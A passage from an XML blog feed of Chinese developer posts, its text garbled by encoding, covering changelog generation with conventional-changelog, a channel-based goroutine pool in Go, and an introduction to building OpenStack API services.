ÊòØÂê¶Á¨¶ÂêàÊ†ºÂºè„ÄÇÊàëÊöÇÊó∂‰∏çÈúÄË¶Å,githubÂú∞ÂùÄ ÁîüÊàêChange logÁöÑÂ∑•ÂÖ∑conventional-changelog Â∞±ÊòØÁîüÊàê Change log ÁöÑÂ∑•ÂÖ∑ÔºåËøêË°å‰∏ãÈù¢ÁöÑÂëΩ‰ª§Âç≥ÂèØ„ÄÇgithubÂú∞ÂùÄ123$ npm install -g conventional-changelog-cli$ cd my-project$ conventional-changelog -p angular -i CHANGELOG.md -s ‰∏äÈù¢ÂëΩ‰ª§‰∏ç‰ºöË¶ÜÁõñ‰ª•ÂâçÁöÑ Change logÔºåÂè™‰ºöÂú®CHANGELOG.mdÁöÑÂ§¥ÈÉ®Âä†‰∏äËá™‰ªé‰∏äÊ¨°ÂèëÂ∏É‰ª•Êù•ÁöÑÂèòÂä®„ÄÇÂ¶ÇÊûú‰Ω†ÊÉ≥ÁîüÊàêÊâÄÊúâÂèëÂ∏ÉÁöÑ Change logÔºåË¶ÅÊîπ‰∏∫ËøêË°å‰∏ãÈù¢ÁöÑÂëΩ‰ª§„ÄÇ1$ conventional-changelog -p angular -i CHANGELOG.md -w -r 0 ‰∏∫‰∫ÜÊñπ‰æø‰ΩøÁî®ÔºåÂèØ‰ª•Â∞ÜÂÖ∂ÂÜôÂÖ•package.jsonÁöÑscriptsÂ≠óÊÆµ„ÄÇ1234&#123; "scripts": &#123; "changelog": "conventional-changelog -p angular -i CHANGELOG.md -w -r 0" &#125;&#125; ‰ª•ÂêéÔºåÁõ¥Êé•ËøêË°å‰∏ãÈù¢ÁöÑÂëΩ‰ª§Âç≥ÂèØ„ÄÇ1$ npm run changelog]]></content>
      <categories>
        <category>ÂºÄÂèëÂ∑•ÂÖ∑</category>
        <category>git</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[GolangÂπ∂ÂèëÁºñÁ®ã-ÂçèÁ®ãÊ±†]]></title>
    <url>%2F2017%2F01%2F12%2Fgoroutine-pool%2F</url>
    <content type="text"><![CDATA[Âú®ÊúÄËøëÂºÄÂèëÁöÑÈ°πÁõÆ‰∏≠ÔºåÂêéÁ´ØÈúÄË¶ÅÁºñÂÜôËÆ∏Â§öÊèê‰æõHTTPÊé•Âè£ÁöÑAPIÔºå‰πãÊâÄ‰ª•ÈÄâÊã©GolangÔºå‰∏ªË¶ÅÊòØËÄÉËôëÂà∞ÂºÄÂèëÁöÑÊ®°ÂùóÔºåÈÉΩÈúÄË¶ÅÊé•ÂèóÁû¨Êó∂Â§ßÂπ∂Âèë„ÄÅ„ÄÅCPUÂØÜÈõÜÂûãÁöÑÂàÜÊûê‰ªªÂä°„ÄÅÂ§ÑÁêÜÊó∂Èó¥ËæÉÈïø„ÄÅÊó†Ê≥ïÂêåÊ≠•Á´ãÂç≥ËøîÂõûÁªìÊûúÁöÑÂú∫ÊôØÔºåGolangÁöÑgoroutine‰ª•ÂèächannelÊâÄÊèê‰æõÁöÑËØ≠Ë®ÄÂ±ÇÁ∫ßÁöÑÁâπÊÄßÔºåÊ≠£Â•ΩÂèØ‰ª•Êª°Ë∂≥ËøôÊñπÈù¢ÁöÑÈúÄË¶Å Â¶Ç‰ΩïÈ´òÂπ∂ÂèëÂπ∂ÂèëÊ®°Âºè‰∏ãÊúâÂæàÂ§öÈóÆÈ¢òÈúÄË¶ÅÊàë‰ª¨ÂÖ≥Ê≥®, Âõ†Ê≠§Êàë‰ª¨ËÆæËÆ°Âá∫Êù•ÁöÑgoroutine poolÂ∫îËØ•ÂÖ≥Ê≥®Â¶Ç‰∏ã‰∏Ä‰∫õÈóÆÈ¢ò goroutineÁöÑÈ´òÂπ∂ÂèëgoroutineÁöÑ‰∏Ä‰∏™‰∏ªË¶ÅÁâπÊÄßÂ∞±ÊòØÂÆÉ‰ª¨ÁöÑÊ∂àËÄóÔºõÂàõÂª∫ÂÆÉ‰ª¨ÁöÑÂàùÂßãÂÜÖÂ≠òÊàêÊú¨Âæà‰Ωé(‰∏éÈúÄË¶Å1Ëá≥8MBÂÜÖÂ≠òÁöÑ‰º†ÁªüPOSIXÁ∫øÁ®ãÂΩ¢ÊàêÈ≤úÊòéÂØπÊØî)‰ª•ÂèäÊ†πÊçÆÈúÄË¶ÅÂä®ÊÄÅÂ¢ûÈïøÂíåÁº©ÂáèÂç†Áî®ÁöÑËµÑÊ∫ê„ÄÇËøô‰ΩøÂæógoroutine‰ºö‰ªé4096Â≠óËäÇÁöÑÂàùÂßãÊ†àÂÜÖÂ≠òÂç†Áî®ÂºÄÂßãÊåâÈúÄÂ¢ûÈïøÊàñÁº©ÂáèÂÜÖÂ≠òÂç†Áî®, Âú®‰∏ÄËà¨ÁöÑÈúÄÊ±Ç‰∏ã, Êàë‰ª¨Êó†ÈúÄÊãÖÂøÉËµÑÊ∫êÁöÑËÄóÂ∞Ω„ÄÇ GoËØ≠Ë®ÄÈÄöËøáÁ≥ªÁªüÁöÑÁ∫øÁ®ãÊù•Â§öË∑ØÊ¥æÈÅ£Ëøô‰∫õÂáΩÊï∞ÁöÑÊâßË°åÔºå‰ΩøÂæóÊØè‰∏™Áî®goÂÖ≥ÈîÆÂ≠óÊâßË°åÁöÑÂáΩÊï∞ÂèØ‰ª•ËøêË°åÊàê‰∏∫‰∏Ä‰∏™Âçï‰ΩçÂçèÁ®ã„ÄÇÂΩì‰∏Ä‰∏™ÂçèÁ®ãÈòªÂ°ûÁöÑÊó∂ÂÄôÔºåË∞ÉÂ∫¶Âô®Â∞±‰ºöËá™Âä®ÊääÂÖ∂‰ªñÂçèÁ®ãÂÆâÊéíÂà∞Âè¶Â§ñÁöÑÁ∫øÁ®ã‰∏≠ÂéªÊâßË°åÔºå‰ªéËÄåÂÆûÁé∞‰∫ÜÁ®ãÂ∫èÊó†Á≠âÂæÖÂπ∂Ë°åÂåñËøêË°å„ÄÇËÄå‰∏îË∞ÉÂ∫¶ÁöÑÂºÄÈîÄÈùûÂ∏∏Â∞èÔºå‰∏ÄÈ¢óCPUË∞ÉÂ∫¶ÁöÑËßÑÊ®°‰∏ç‰∏ã‰∫éÊØèÁßíÁôæ‰∏áÊ¨°ÔºåËøô‰ΩøÂæóÊàë‰ª¨ËÉΩÂ§üÂàõÂª∫Â§ßÈáèÁöÑgoroutineÔºå‰ªéËÄåÂèØ‰ª•ÂæàËΩªÊùæÂú∞ÁºñÂÜôÈ´òÂπ∂ÂèëÁ®ãÂ∫èÔºåËææÂà∞Êàë‰ª¨ÊÉ≥Ë¶ÅÁöÑÁõÆÁöÑ ÁÆÄÂçïÊù•ËØ¥ÔºöÂçèÁ®ãÂçÅÂàÜËΩªÈáèÔºåÂèØ‰ª•Âú®‰∏Ä‰∏™ËøõÁ®ã‰∏≠ÊâßË°åÊúâÊï∞‰ª•ÂçÅ‰∏áËÆ°ÁöÑÂçèÁ®ãÔºå‰æùÊóß‰øùÊåÅÈ´òÊÄßËÉΩ„ÄÇ Âõ†Ê≠§Êàë‰ª¨‰ΩøÁî®goroutineÂ§ÑÁêÜ‰ªªÂä°, Â§ßÊ¶ÇÊ®°Âûã‰∏∫Ôºö1234567891011121314151617package mainimport ( "fmt" "time")func say(s string) &#123; fmt.Println(s)&#125;func main() &#123; for _, word := range []string&#123;"hello", "world", "this", "is", "my", "goroutine", "test"&#125; &#123; go say(word) //ÂºÄ‰∏Ä‰∏™Êñ∞ÁöÑGoroutinesÊâßË°å &#125; time.Sleep(time.Second * 1) // Á≠âÂæÖgoroutineË∑ëÂÆå, Êàë‰∏∫‰∫ÜÊñπ‰æø‰ΩøÁî®‰∫ÜsleepÁöÑÊñπÂºè&#125; Âà©Áî®ÂçèÂ∫èÊ±†ÂÅöÂπ∂ÂèëÊéßÂà∂ËôΩÁÑ∂goroutineÂæà‰æøÂÆú, ‰ΩÜ‰πü‰∏çÊòØÂÖçË¥πÁöÑ, ÊÄªÊúâ‰∏Ä‰∏™Êó∂ÂÄô‰Ω†Á≥ªÁªü‰ºöÊâõ‰∏ç‰ΩèÔºåÊàë‰ª¨‰∏çËÉΩÂ§©ÁúüÁöÑÂØπgoroutineÁöÑÊï∞Èáè‰∏çÂä†ÈôêÂà∂ÁöÑ‰ΩøÁî®, Âõ†Ê≠§Êàë‰ª¨ÈúÄË¶Å‰∏ÄÁßçÂπ∂ÂèëÁöÑÈôêÂà∂Êú∫Âà∂Êù•‰øùËØÅÁ®ãÂ∫èÁöÑÁ®≥ÂÆö, ‰ΩøÂæóÁ®ãÂ∫è‰∏ç‰ºöÂõ†‰∏∫ËøáÂ§öÁöÑgoroutineËÄåÂ¥©Ê∫É, Ëá≥‰∫éÂ§öÂ∞ë‰∏™goroutine Â∞±ÈúÄË¶ÅÊ†πÊçÆËá™Â∑±ÁéØÂ¢ÉÊµãËØïÂæóÂá∫„ÄÇ Â¶Ç‰ΩïÂØπgoroutineÂÅöÂπ∂ÂèëÈôêÂà∂ÂñÉÔºü‰ΩøÁî®JavaÂíåCÊ¶ÇÂøµ‰∏≠ÁöÑÁ∫øÁ®ãÊ±†Êù•Â§ÑÁêÜÊòØ‰∏™‰∏çÈîôÁöÑÊñπÊ≥ïÔºåÊàë‰ª¨‰ºö‰ΩøÁî®ChannelÂÆûÁé∞Queue+WorkerÊ®°Âûã, Êï¥‰∏™ËøáÁ®ãÔºöÂ∞ÜËØ∑Ê±ÇÈÉΩËΩ¨ÂèëÁªô‰∏Ä‰∏™channelÔºåÁÑ∂ÂêéÂàùÂßãÂåñÂ§ö‰∏™goroutineËØªÂèñËøô‰∏™channel‰∏≠ÁöÑÂÜÖÂÆπÔºåÂπ∂ËøõË°åÂ§Ñ ÈÅøÂÖçÊé•Êî∂ChannelÈòªÂ°ûÂ¶ÇÊûúchannelÂàùÂßãÂåñÊó∂ÊòØÊ≤°ÊúâËÆæÁΩÆÈïøÂ∫¶ÁöÑÔºåÊ≠§Êó∂Â¶ÇÊûúÂçèÂ∫èÊ±†ÈÉΩÊª°Ë¥üËç∑Â∑•‰ΩúÔºåÂÜçÊúâËØ∑Ê±ÇËøáÊù•ÁöÑËØùÔºå‰ªçÁÑ∂‰ºöÂá∫Áé∞Ë¢´blockÁöÑÊÉÖÂÜµÔºåËÄå‰∏î‰ºöÊØîÊ≤°ÊúâÁªèËøá‰ºòÂåñÁöÑÊñπÊ°àËøòË¶ÅÊÖ¢ ÈÅáÂà∞ËøôÁßçÊÉÖÂÜµÔºåÊàë‰ª¨Â∫îËØ•Â∏åÊúõÊ®°ÂùóËÉΩÂ§üÂèäÊó∂ÂëäÁü•Ë∞ÉÁî®ÊñπÔºå‚ÄúÊàëÂ∑≤ÁªèËææÂà∞Â§ÑÁêÜÊûÅÈôê‰∫ÜÔºåÊó†Ê≥ïÁªô‰Ω†Â§ÑÁêÜËØ∑Ê±Ç‰∫Ü‚Äù„ÄÇÂÖ∂ÂÆûÔºåËøôÁßçÈúÄÊ±ÇÔºåÂèØ‰ª•ÂæàÁÆÄÂçïÁöÑÂú®Golang‰∏≠ÂÆûÁé∞ÔºöÂ¶ÇÊûúchannelÂèëÈÄÅ‰ª•ÂèäÊé•Êî∂Êìç‰ΩúÂú®selectËØ≠Âè•‰∏≠ÊâßË°åÂπ∂‰∏îÂèëÁîüÈòªÂ°ûÔºådefaultËØ≠Âè•Â∞±‰ºöÁ´ãÂç≥ÊâßË°å„ÄÇ Êé•Êî∂ÊâßË°åÁªìÊûúÊàë‰ª¨Êó¢ÈúÄË¶ÅÊääÁªìÊûúÂèëÈÄÅÁªôÊüê‰∏™channelÔºåËé∑ÂèñÂà∞Â§ÑÁêÜËøôÊ¨°ËØ∑Ê±ÇÁöÑÁªìÊûú„ÄÇËß£ÂÜ≥ÁöÑÊñπÊ≥ïÊòØÔºöÂ∞Ü‰∏Ä‰∏™channelÂÆû‰æãÂåÖÂê´Âú®ËØ∑Ê±Ç‰∏≠ÔºågoroutineÂ§ÑÁêÜÂÆåÊàêÂêéÂ∞ÜÁªìÊûúÂÜôÂõûËøô‰∏™channel ‰ªªÂä°Ë∂ÖÊó∂Êú∫Âà∂Âç≥‰ΩøÊòØÂ§çÊùÇ„ÄÅËÄóÊó∂ÁöÑ‰ªªÂä°Ôºå‰πüÂøÖÈ°ªËÆæÁΩÆË∂ÖÊó∂Êó∂Èó¥„ÄÇ‰∏ÄÊñπÈù¢ÂèØËÉΩÊòØ‰∏öÂä°ÂØπÊ≠§ÊúâÊó∂ÈôêË¶ÅÊ±ÇÔºàÁî®Êà∑ÂøÖÈ°ªÂú®XXÂàÜÈíüÂÜÖÁúãÂà∞ÁªìÊûúÔºâÔºåÂè¶‰∏ÄÊñπÈù¢Ê®°ÂùóÊú¨Ë∫´‰πü‰∏çËÉΩÈÉΩÊ∂àËÄóÂú®‰∏ÄÁõ¥Êó†Ê≥ïÁªìÊùüÁöÑ‰ªªÂä°‰∏äÔºå‰ΩøÂæóÂÖ∂‰ªñËØ∑Ê±ÇÊó†Ê≥ïÂæóÂà∞Ê≠£Â∏∏Â§ÑÁêÜ„ÄÇÂõ†Ê≠§Ôºå‰πüÈúÄË¶ÅÂØπÂ§ÑÁêÜÊµÅÁ®ãÂ¢ûÂä†Ë∂ÖÊó∂Êú∫Âà∂„ÄÇ Êàë‰∏ÄËà¨ËÆæÁΩÆË∂ÖÊó∂ÁöÑÊñπÊ°àÊòØÔºöÂíå‰πãÂâçÊèêÂà∞ÁöÑ‚ÄúÊé•Êî∂ÂèëÈÄÅÁªôchannel‰πãÂêéËøîÂõûÁöÑÁªìÊûú‚ÄùÁªìÂêàËµ∑Êù•ÔºåÂú®Á≠âÂæÖËøîÂõûchannelÁöÑÂ§ñÂ±ÇÊ∑ªÂä†selectÔºåÂπ∂Âú®ÂÖ∂‰∏≠ÈÄöËøátime.After()Êù•Âà§Êñ≠Ë∂ÖÊó∂ ÂçèÁ®ãÁöÑ‰ºòÈõÖÈÄÄÂá∫ÂçèÂ∫èÊ±†ÈáåÈù¢ÁöÑÂçèÂ∫èÊàë‰ª¨‰πüÈúÄË¶Å‰ºòÈõÖÈÄÄÂá∫ÔºåËß£ÂÜ≥ÊñπÊ≥ïÂæàÁÆÄÂçï, Áõ¥Êé•ÈÄöËøáselectÁõëÂê¨‰∏Ä‰∏™ÈÄÄÂá∫channel, Á≠âÂæÖÂ§ñÈÉ®ÈÄöÁü•, Â•ΩÁªàÊ≠¢ÂçèÁ®ã ÂÆûÁé∞ÂçèÁ®ãÊ±†Êé•‰∏ãÈáåÊàë‰ª¨Â∞ÜÂÆûÁé∞‰∏Ä‰∏™Êª°Ë∂≥‰∏äËø∞ÈúÄÊ±ÇÁöÑGoroutine pool ÊµÅÁ®ãÂõæ ‰ª£Á†Å123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129package mainimport "os"var ( // MaxWorker is the number of goroutine worker to start MaxWorker = os.Getenv("MAX_WORKERS") // MaxQueue is the job Queue buffered lenth MaxQueue = os.Getenv("MAX_QUEUE") // JobQueue is a buffered channel that we can send work requests on. JobQueue chan Job // WorkerPool is a pool of workers that are instantianted to perform the work WorkerPool chan chan Job)// Job represents the job to be runtype Job struct &#123; ID int task func()&#125;// Worker represents the worker that executes the jobtype Worker struct &#123; ID int InputQueue chan Job OutputQueue chan Result QuitQueue chan bool WorkerPool chan chan Job&#125;// Result use to collect the task resulttype Result struct &#123; JobID int Data interface&#123;&#125; Err error&#125;// GoroutinePool is a pool of workers channels that are registered with the GoroutinePooltype GoroutinePool struct &#123; maxWorkers int maxQueue int JobQueue chan Job ResultQueue chan Result WorkerPool chan chan Job&#125;// NewWorker is factory function to new a workerfunc NewWorker(id int, workerPool chan chan Job) *Worker &#123; worker := Worker&#123; ID: id, InputQueue: make(chan Job), OutputQueue: make(chan Result), WorkerPool: workerPool, QuitQueue: make(chan bool), &#125; return &amp;worker&#125;// Start method starts the run loop for the worker, listening for a quit channel// in case we need to stop itfunc (w Worker) Start() &#123; go func() &#123; for &#123; // register the current worker into the worker queue. w.WorkerPool &lt;- w.InputQueue select &#123; // we have received a work request case job := &lt;-w.InputQueue: job.task() // we have received a signal to stop case &lt;-w.QuitQueue: return &#125; &#125; &#125;()&#125;// Stop signals the worker to stop listening for work requests.func (w Worker) Stop() &#123; go func() &#123; w.QuitQueue &lt;- true &#125;()&#125;// NewGoroutinePool is a factory function to new a GoroutinePoolfunc NewGoroutinePool(maxWorkers int, maxQueue int) *GoroutinePool &#123; return &amp;GoroutinePool&#123; WorkerPool: make(chan chan Job, maxWorkers), JobQueue: make(chan Job, maxQueue), ResultQueue: make(chan Result, maxQueue), maxWorkers: maxWorkers, maxQueue: maxQueue, &#125;&#125;// dispatch use to dispatch the jobfunc (d *GoroutinePool) dispatch() &#123; for &#123; select &#123; case job := &lt;-d.JobQueue: // a job request has benn received go func(job Job) &#123; // try to obtain a worker job channel that is available. // this will block until a worker is idle jobChan := &lt;-d.WorkerPool // dispatch the job to the worker jobChan jobChan &lt;- job &#125;(job) &#125; &#125;&#125;// Run use to starting n number os workersfunc (d *GoroutinePool) Run() &#123; for i := 0; i &lt; d.maxWorkers; i++ &#123; worker := NewWorker(i+1, d.WorkerPool) worker.Start() &#125; go d.dispatch()&#125;// AddJob is a method to add job to job channelfunc (d *GoroutinePool) AddJob(job Job) (msg string, err error) &#123; JobQueue &lt;- job return "add a job to Job queue", nil&#125; ÊµãËØï]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>goroutine</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Â¶Ç‰ΩïÂºÄÂèëOpenstackÊúçÂä°-ÂºÄÁØá(‰∏Ä)]]></title>
    <url>%2F2017%2F01%2F10%2Fdevelop-openstack-service%2F</url>
    <content type="text"><![CDATA[openstackÊòØÊàëËßÅËøáÊúÄÂ§ßÊúÄÂ§çÊùÇÁöÑpythonÈ°πÁõÆ, ËôΩÁÑ∂openstackÈ°πÁõÆÁöÑÁÉ≠Â∫¶Âú®‰∏ãÊªë, ‰ΩÜÊòØopenstackËøôÂ•óÂºÄÂèëÁêÜÂøµ‰ªªÁÑ∂ÊòØÁõ∏ÂΩì‰∏çÈîôÁöÑÔºåÂÄºÂæóÊàë‰ª¨Â≠¶‰π†. Áî±‰∫éÂ∑•‰ΩúÈúÄË¶Å, Êàë‰πüÈúÄË¶ÅÂºÄÂèë‰∏Ä‰∫õËá™ÂÆö‰πâÁöÑopenstackÊúçÂä°, Âõ†Ê≠§ÊÉ≥Â∞ÜÂºÄÂèëopenstackÊúçÂä°ÁöÑËøáÁ®ã‰ª•‰∏ÄÁ≥ªÂàóÁöÑÊñáÁ´†ËÆ∞ÂΩï‰∏ãÊù•, Êñπ‰æøÈúÄË¶ÅÁöÑ‰∫∫„ÄÇ openstackÁÆÄ‰ªãopenstackÊòØ‰∏Ä‰∏™IaaSÂπ≥Âè∞, Êèê‰æõËÆ°ÁÆóÊúçÂä°„ÄÅÁΩëÁªúÊúçÂä°„ÄÅÂ≠òÂÇ®ÊúçÂä°Á≠â, Êúâ3ÁßçÊñπÂºè‰ΩøÁî®openstackÊèê‰æõÁöÑÊúçÂä° APIÈÄöËøáAPI‰ΩøÁî®OpenStackÁöÑÊñπÂºèÊòØÁî±ÂêÑ‰∏™ÊúçÂä°Ëá™Â∑±ÂÆûÁé∞ÁöÑ, Ëøô‰∫õAPIÈÉΩÊòØÊúâÁªü‰∏ÄÁöÑÂΩ¢ÂºèÁöÑÔºåÈÉΩÊòØÈááÁî®‰∫ÜHTTPÂçèËÆÆÂÆûÁé∞ÁöÑÁ¨¶ÂêàRESTËßÑËåÉÁöÑAPI„ÄÇ CLI/SDKÈÄöËøáÂëΩ‰ª§Ë°åÊòØÁî®OpenStackÊúçÂä°ÁöÑÊñπÂºèÊòØÁî±‰∏ÄÁ≥ªÂàóÈ°πÁõÆÊù•Êèê‰æõÁöÑÔºåËøô‰∫õÈ°πÁõÆ‰∏ÄËà¨ÈÉΩÂëΩÂêç‰∏∫python-projectclientÔºåÊØîÂ¶Çpython-keystoneclientÔºåpython-novaclietnÁ≠â„ÄÇËøô‰∫õÂëΩ‰ª§Ë°åÈ°πÁõÆÂàÜÂà´ÂØπÂ∫îÂà∞ÂêÑ‰∏™‰∏ªË¶ÅÁöÑÊúçÂä°Ôºå‰∏∫Áî®Êà∑Êèê‰æõÂëΩ‰ª§Ë°åÊìç‰ΩúÁïåÈù¢ÂíåPythonÁöÑSDK„ÄÇÊØîÂ¶Çpython-keystoneclientÂØπÂ∫îÂà∞keystoneÔºå‰∏∫Áî®Êà∑Êèê‰æõ‰∫ÜkeystoneËøô‰∏™ÂëΩ‰ª§ÔºåÂêåÊó∂‰πüÊèê‰æõ‰∫ÜkeystonÈ°πÁõÆÁöÑSDKÔºàÂÖ∂ÂÆûÊòØÂú®SDKÁöÑÂü∫Á°Ä‰∏äÂÆûÁé∞‰∫ÜÂëΩ‰ª§Ë°åÔºâ„ÄÇËøô‰∫õclientÈ°πÁõÆÊèê‰æõÁöÑSDKÂÖ∂ÂÆû‰πüÊòØÂ∞ÅË£Ö‰∫ÜÂØπÂêÑËá™ÊúçÂä°ÁöÑAPIÁöÑË∞ÉÁî®„ÄÇÁî±‰∫éÊØè‰∏™‰∏ªË¶ÅÈ°πÁõÆÈÉΩÊúâ‰∏Ä‰∏™Ëá™Â∑±ÁöÑÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑ÔºåÁ§æÂå∫ËßâÂæó‰∏çÂ•ΩÔºå‰∫éÊòØÂèàÊúâ‰∫Ü‰∏Ä‰∏™Êñ∞ÁöÑÈ°πÁõÆpython-openstackclientÔºåÁî®Êù•Êèê‰æõ‰∏Ä‰∏™Áªü‰∏ÄÁöÑÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑openstackÔºàÂëΩ‰ª§ÁöÑÂêçÂ≠óÂ∞±Âè´ÂÅöopenstackÔºâÔºåËøô‰∏™Â∑•ÂÖ∑ÂÆûÁé∞‰∫ÜÂëΩ‰ª§Ë°åÔºåÁÑ∂Âêé‰ΩøÁî®ÂêÑ‰∏™ÊúçÂä°ÁöÑclientÈ°πÁõÆÊèê‰æõÁöÑSDKÊù•ÂÆåÊàêÂØπÂ∫îÁöÑÊìç‰Ωú WebUIÈÄöËøáWebÁïåÈù¢‰ΩøÁî®OpenStackÊúçÂä°ËøôÁßçÊñπÂºèÊòØÈÄöËøáOpenStackÁöÑHorizonÈ°πÁõÆÊèê‰æõÁöÑ„ÄÇHorizonÈ°πÁõÆÊòØ‰∏Ä‰∏™DjangoÂ∫îÁî®ÔºåÂÆûÁé∞‰∫Ü‰∏Ä‰∏™Èù¢ÊùøÂäüËÉΩÔºåÊòØ‰º†ÁªüÁöÑMVCÂºÄÂèëÊ®°Âûã, ‰∏çËøáÊúÄÊñ∞ÁöÑÈ°πÁõÆ Âú®ÊÖ¢ÊÖ¢ÂæÄAngular‰∏äËøÅÁßª„ÄÇHorizonÈ°πÁõÆ‰∏ªË¶ÅÊòØÊèê‰æõ‰∏ÄÁßç‰∫§‰∫íÁïåÈù¢ÔºåÂÆÉ‰ºöÈÄöËøáAPIÊù•ÂíåÂêÑ‰∏™OpenStackÊúçÂä°ËøõË°å‰∫§‰∫íÔºåÁÑ∂ÂêéÂú®WebÁïåÈù¢‰∏äÂ±ïÁ§∫ÂêÑ‰∏™ÊúçÂä°ÁöÑÁä∂ÊÄÅÔºõÂÆÉ‰πü‰ºöÊé•Êî∂Áî®Êà∑ÁöÑÊìç‰ΩúÔºåÁÑ∂ÂêéË∞ÉÁî®ÂêÑ‰∏™ÊúçÂä°ÁöÑAPIÊù•ÂÆåÊàêÁî®Êà∑ÂØπÂêÑ‰∏™ÊúçÂä°ÁöÑ‰ΩøÁî® Âõ†Ê≠§ÂºÄÂèë‰∏Ä‰∏™ÂÆåÊï¥ÁöÑopenstackÈ°πÁõÆÈúÄË¶ÅÂÆåÊàê‰∏äÈù¢‰ªãÁªçÁöÑ3ÈÉ®ÂàÜÁöÑÂºÄÂèëÔºåÂΩìÁÑ∂APIÊúçÂä°ÊòØÊ†πÊú¨„ÄÇ openstackÊû∂ÊûÑÊï¥‰∏™openstackÁöÑÊúçÂä°ÊòØ‰ª•Êèí‰ª∂ÂåñÂæóÊñπÂºèËøõË°åÁã¨Á´ãÂºÄÂèë, ÁÑ∂ÂêéÈÄöËøáAPIÁõ∏‰∫íÂÖ≥ËÅî, ÊØîÂ¶Ç:Êé•‰∏ãÊù•Êàë‰ª¨‰ºö‰ª•demoÁöÑÂΩ¢ÂºèÂºÄÂèë‰∏Ä‰∏™ÂíåopenstackÊúçÂä°Á±ª‰ººÁöÑÊúçÂä°ÔºåËØ•ÊúçÂä°ÁöÑÂêçÁß∞Â∞±Âè´demo openstack‰∏≠ÁöÑapiÊúçÂä°openstackÁöÑAPIËÆæËÆ°È£éÊ†º‰∏∫RESTful, Â¶Ç‰ΩïËÆæËÆ°RESTful APIÊàëÂú®ÂâçÈù¢ÁöÑÂçöÂÆ¢‰∏≠Êúâ‰ªãÁªç, PythonÁöÑWebÂºÄÂèëÊ°ÜÊû∂ÂæàÂ§öÔºåÂü∫Êú¨‰∏äÔºåËøòÊ¥ªË∑ÉÁöÑÊ°ÜÊû∂ÈÉΩÊîØÊåÅRESTful APIÁöÑÂºÄÂèë, Êúâ‰∫õÊ°ÜÊû∂Ëøò‰∏ìÈó®‰∏∫RESTful APIÁöÑÂºÄÂèëÊèê‰æõ‰∫Ü‰æøÂà©ÁöÑÂäüËÉΩ,ÊØîÂ¶ÇPecanÔºåÊúâ‰∫õÊ°ÜÊû∂ÂàôÈÄöËøáÁ¨¨‰∏âÊñπÊ®°ÂùóÊù•Êèê‰æõËøôÁßç‰æøÂà©ÔºåÊØîÂ¶ÇDjangoÂíåFlaskÈÉΩÊúâ‰∏çÂ∞ëÂíåRESTÁõ∏ÂÖ≥ÁöÑÁ¨¨‰∏âÊñπÂ∫ì„ÄÇÂØπ‰∫éÊ°ÜÊû∂ÈÄâÊã©Ôºå‰πüÊ≤°Êúâ‰ªÄ‰πàÁâπÂà´Â•ΩÁöÑÊ†áÂáÜÔºå‰∏ÄËà¨ÈÉΩÊòØÊØîËæÉÊÄßËÉΩ„ÄÅÊñáÊ°£„ÄÅÁ§æÂå∫ÊòØÂê¶Ê¥ªË∑ÉÁ≠â„ÄÇÂú®ÊàëÁúãÊù•ÔºåÈÄâÊã©ÊµÅË°åÁöÑ‰∏ÄËà¨Â∞±‰∏ç‰ºöÈîô‰∏ãÈù¢ÊòØopenstack keystoneÂÖ≥‰∫écredentialÁöÑAPI: Êó©ÊúüÈ°πÁõÆÁöÑapiÊúçÂä°OpenStackÈ°πÁõÆÂÄæÂêë‰∫é‰∏çÈáçÊñ∞ÂèëÊòéËΩÆÂ≠êÔºå‰∏ÄËà¨ÈÉΩ‰ºöÈÄâÊã©Áé∞ÊúâÁöÑÂ∫ìÂíåÊ°ÜÊû∂Êù•‰ΩøÁî®ÔºåÈô§ÈùûÁé∞ÊúâÁöÑÊ°ÜÊû∂‰∏çÊª°Ë∂≥ÈúÄÊ±Ç„ÄÇÂõ†‰∏∫WebÊ°ÜÊû∂ÁöÑÈÄâÊã©ÂæàÂ§öÔºåËÄå‰∏îÈÉΩÊª°Ë∂≥ÈúÄÊ±ÇÔºåÊâÄ‰ª•OpenStackÈ°πÁõÆÂà∞ÁõÆÂâç‰∏∫Ê≠¢ÈÉΩÊòØ‰ΩøÁî®Áé∞ÊàêÁöÑWebÊ°ÜÊû∂„ÄÇOpenStackÊó©ÊúüÁöÑÈ°πÁõÆÂπ∂Ê≤°Êúâ‰ΩøÁî®‰∏Ä‰∏™Ê°ÜÊû∂ÔºåËÄåÊòØ‰ΩøÁî®‰∫ÜÂá†‰∏™‰∏çÂêåÁöÑÊ®°ÂùóÊù•ÁªÑÂêàÂá∫‰∏Ä‰∏™Ê°ÜÊû∂ÔºöPaste + PasteDeploy + Routes + WebObÔºåËøôÂá†‰∏™‰∏çÂêåÁöÑÊ®°ÂùóÂàÜÂà´Ë¥üË¥£Â∫îÁî®ÁöÑWSGIÂåñ„ÄÅURLË∑ØÁî±ÂíåËØ∑Ê±ÇÂ§ÑÁêÜÁ≠âÂäüËÉΩ„ÄÇNova, Glance, Neutron, KeystoneÁ≠âÊó©ÊúüÁöÑÈ°πÁõÆÈÉΩÊòØ‰ΩøÁî®ËøôÊ†∑ÁöÑÊû∂ÊûÑÊù•ÂÆûÁé∞RESTful APIÁöÑ„ÄÇÊó©ÊúüÁöÑËøôÁßçÊäÄÊúØÈÄâÂûãÂ∏¶Êù•ÁöÑÂ•ΩÂ§ÑÊòØ‚ÄùÊ°ÜÊû∂‚ÄùÂÖ∑Â§áË∂≥Â§üÁöÑÁÅµÊ¥ªÊÄßÔºåÁº∫ÁÇπÂàôÊòØË¶ÅÊääËøôÂá†‰∏™Ê®°ÂùóÁªÑÂêàËµ∑Êù•ÂÆûÁé∞‰∏Ä‰∏™RESTÊúçÂä°ÔºåÈúÄË¶ÅÂÜôÂæàÂ§ö‰ª£Á†ÅÔºåËøûWSGIÁöÑÂÖ•Âè£ÂáΩÊï∞ÈÉΩË¶ÅËá™Â∑±ÂÆûÁé∞ÔºàÊØîÂ¶ÇKeystoneÈ°πÁõÆÁöÑkeystone/common/wsgi.pyÊñá‰ª∂‰∏≠ÁöÑclass 